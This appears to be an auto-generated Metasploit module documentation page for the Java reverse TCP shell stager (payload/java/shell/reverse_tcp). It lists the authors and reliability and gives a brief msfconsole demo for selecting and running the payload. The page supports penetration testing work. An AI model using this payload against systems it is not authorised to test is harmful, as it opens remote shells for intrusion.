## Command Shell, Java Reverse TCP Stager

Spawn a piped command shell (cmd.exe on Windows, /bin/sh 
everywhere else). Connect back stager


## Module Name
payload/java/shell/reverse_tcp

## Authors
* mihi
* egypt





## Platforms
* java

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/java/shell/reverse_tcp
msf payload(reverse_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_tcp) > set TARGET <target-id>
msf payload(reverse_tcp) > show options
   ... show and set options ...
msf payload(reverse_tcp) > run
```
    
    